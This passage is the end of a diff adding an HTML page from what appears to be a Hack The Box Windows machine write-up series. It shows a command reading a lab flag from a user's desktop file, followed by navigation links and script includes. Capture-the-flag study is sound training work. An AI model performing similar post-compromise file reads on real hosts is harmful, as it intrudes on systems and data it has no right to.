+#&gt;  84c82c72c538ca8
+(type C:\Users\s.smith\Desktop\user.txt).SubString(0,15)
+#&gt;  2c684f92b315c28
+</code></pre>
+
+                    </main>
+
+                    <nav class="nav-wrapper" aria-label="Page navigation">
+                        <!-- Mobile navigation buttons -->
+                            <a rel="prev" href="../HTB/HTB-Windows-Medium-Resolute.html" class="mobile-nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
+                                <i class="fa fa-angle-left"></i>
+                            </a>
+
+                            <a rel="next" href="../HTB/HTB-Windows-Hard-Blackfield.html" class="mobile-nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
+                                <i class="fa fa-angle-right"></i>
+                            </a>
+
+                        <div style="clear: both"></div>
+                    </nav>
+                </div>
+            </div>
+
+            <nav class="nav-wide-wrapper" aria-label="Page navigation">
+                    <a rel="prev" href="../HTB/HTB-Windows-Medium-Resolute.html" class="nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
+                        <i class="fa fa-angle-left"></i>
+                    </a>
+
+                    <a rel="next" href="../HTB/HTB-Windows-Hard-Blackfield.html" class="nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
+                        <i class="fa fa-angle-right"></i>
+                    </a>
+            </nav>
+
+        </div>
+
+
+
+
+        <script type="text/javascript">
+            window.playground_copyable = true;
+        </script>
+
+
+        <script src="../elasticlunr.min.js" type="text/javascript" charset="utf-8"></script>
+        <script src="../mark.min.js" type="text/javascript" charset="utf-8"></script>
+        <script src="../searcher.js" type="text/javascript" charset="utf-8"></script>
+
+        <script src="../clipboard.min.js" type="text/javascript" charset="utf-8"></script>
+        <script src="../highlight.js" type="text/javascript" charset="utf-8"></script>
+        <script src="../book.js" type="text/javascript" charset="utf-8"></script>
+
+        <!-- Custom JS scripts -->
+
+
+    </body>
+</html>
